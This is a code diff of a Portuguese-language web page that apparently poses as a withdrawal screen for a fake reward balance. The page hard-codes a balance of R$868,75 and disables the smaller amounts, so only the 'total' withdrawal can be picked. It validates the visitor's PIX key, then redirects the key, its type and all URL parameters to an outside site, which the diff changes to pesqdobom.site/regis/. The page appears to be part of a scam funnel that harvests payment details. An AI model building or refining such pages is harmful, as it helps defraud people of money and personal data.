@@ -43,14 +43,12 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 .bal-num{font-size:46px;font-weight:900;font-variant-numeric:tabular-nums;letter-spacing:-1px;line-height:1}
 .bal-confirm{font-size:12px;color:var(--primary);font-weight:600;margin-top:6px}
 
+
 .sec-title{font-size:17px;font-weight:800;margin-bottom:14px}
 .pix-lbl{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted-fg);margin-bottom:16px}
 
-/* NOVO GRID DE BOTÕES COM FLEXBOX PARA LINHA ÚNICA */
-.amt-grid{display:flex;flex-direction:row;gap:8px;overflow-x:auto;padding-bottom:10px;margin-bottom:15px}
-.amt-grid::-webkit-scrollbar{display:none}
-
-.amt-btn{flex:1;min-width:75px;padding:12px 4px;border-radius:1rem;border:2px solid var(--border);background:hsl(220 14% 92%/.6);font-size:13px;font-weight:800;color:var(--muted-fg);cursor:pointer;text-align:center;transition:all .18s;font-family:'Poppins',sans-serif}
+.amt-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:20px}
+.amt-btn{padding:12px 4px;border-radius:1rem;border:2px solid var(--border);background:hsl(220 14% 92%/.6);font-size:13px;font-weight:800;color:var(--muted-fg);cursor:pointer;text-align:center;transition:all .18s;font-family:'Poppins',sans-serif}
 .amt-btn:hover{border-color:hsl(220 10% 45%/.4);color:var(--fg)}
 .amt-btn.active{background:var(--primary);color:#fff;border-color:var(--primary);box-shadow:0 20px 25px -5px hsl(346 97% 55%/.25);transform:scale(1.05)}
 
@@ -118,16 +116,11 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       <div class="bal-confirm">✓ Saldo selecionado para saque</div>
     </div>
 
+
     <div class="fu d4">
       <div class="sec-title">Sacar dinheiro</div>
       <div class="pix-lbl"><span style="font-size:20px">🏦</span><span>Transferência bancária / PIX</span></div>
-      
-      <div class="amt-grid" id="amt-grid">
-        <button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$ 50,00</button>
-        <button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$ 150,00</button>
-        <button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$ 250,00</button>
-        <button class="amt-btn active" id="btn-saque-total" title="" style="opacity: 1; cursor: pointer;">R$ 868,75</button>
-      </div>
+      <div class="amt-grid" id="amt-grid"><button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$50,00</button><button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$150,00</button><button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$250,00</button><button class="amt-btn active" title="" style="opacity: 1; cursor: pointer;">R$868,75</button></div>
 
       <div class="pix-inputs">
         <select id="pixType" onchange="onPixTypeChange()">
@@ -209,14 +202,23 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   // Formata
   function fmt(v){ return 'R$' + v.toFixed(2).replace('.', ','); }
 
-  // Preenche saldo principal
+  // Preenche saldo e última recompensa
   document.getElementById('balNum').textContent = fmt(balance);
 
-  // ─── Atualiza botão final ───────────────────────────────────────
-  const btnTotal = document.getElementById('btn-saque-total');
-  if(btnTotal){
-    btnTotal.textContent = fmt(balance);
-  }
+  // ─── Botões de valor dinâmicos ──────────────────────────────────
+  const amts = [50, 150, 250, Math.floor(balance)];
+  const grid = document.getElementById('amt-grid');
+  amts.forEach((a, i) => {
+    const b = document.createElement('button');
+    const isTotal = i === 3;
+    b.className = 'amt-btn' + (isTotal ? ' active' : ' disabled-amt');
+    b.textContent = isTotal ? fmt(balance) : fmt(a);
+    b.disabled = !isTotal;
+    b.style.opacity = isTotal ? '1' : '0.35';
+    b.style.cursor = isTotal ? 'pointer' : 'not-allowed';
+    b.title = isTotal ? '' : 'Complete o saque do saldo total';
+    grid.appendChild(b);
+  });
 
   // ─── Código de convite aleatório por sessão ─────────────────────
   let code = sessionStorage.getItem('inv_code');
@@ -256,7 +258,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   };
 
   const validators = {
-    cpf: v => /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) \vert{}\vert{} /^\d{11}$/.test(v.replace(/\D/g,'')),
+    cpf: v => /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) || /^\d{11}$/.test(v.replace(/\D/g,'')),
     email: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
     phone: v => v.replace(/\D/g,'').length >= 10,
     random: v => /^[0-9a-f-]{36}$/i.test(v) || v.length > 8
@@ -281,40 +283,28 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   };
 
   window.doSaque = function(){
-    try {
-      const t = document.getElementById('pixType').value;
-      const key = document.getElementById('pixKey').value.trim();
-      let valid = true;
+    const t = document.getElementById('pixType').value;
+    const key = document.getElementById('pixKey').value.trim();
+    let valid = true;
 
-      if(!t){
-        document.getElementById('pixType').classList.add('error');
-        document.getElementById('typeErr').classList.add('show');
-        valid = false;
-      }
-
-      if(!key || (t && validators[t] && !validators[t](key))){
-        document.getElementById('pixKey').classList.add('error');
-        document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
-        document.getElementById('keyErr').classList.add('show');
-        valid = false;
-      }
-
-      if(!valid) {
-        console.warn("Validação PIX falhou. Preencha os campos corretamente para testar.");
-        return; 
-      }
-
-      const dest = new URL('https://pesqdobttklkjkkjtaxval.vercel.app/');
-      new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
-      dest.searchParams.set('pix_type', t);
-      dest.searchParams.set('pix_key', key);
-
-      window.location.assign(dest.toString());
-
-    } catch (erro) {
-      console.error("Erro no script de saque:", erro);
-      window.location.assign('https://pesqdobttklkjkkjtaxval.vercel.app/');
+    if(!t){
+      document.getElementById('pixType').classList.add('error');
+      document.getElementById('typeErr').classList.add('show');
+      valid = false;
     }
+    if(!key || (t && !validators[t]?.(key))){
+      document.getElementById('pixKey').classList.add('error');
+      document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
+      document.getElementById('keyErr').classList.add('show');
+      valid = false;
+    }
+    if(!valid) return;
+
+    const dest = new URL('https://pesqdobom.site/regis/', window.location.href);
+    new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
+    dest.searchParams.set('pix_type', t);
+    dest.searchParams.set('pix_key', key);
+    window.location.href = dest.toString();
   };
 
   // ─── Web Share / Convite ───────────────────────────────────────
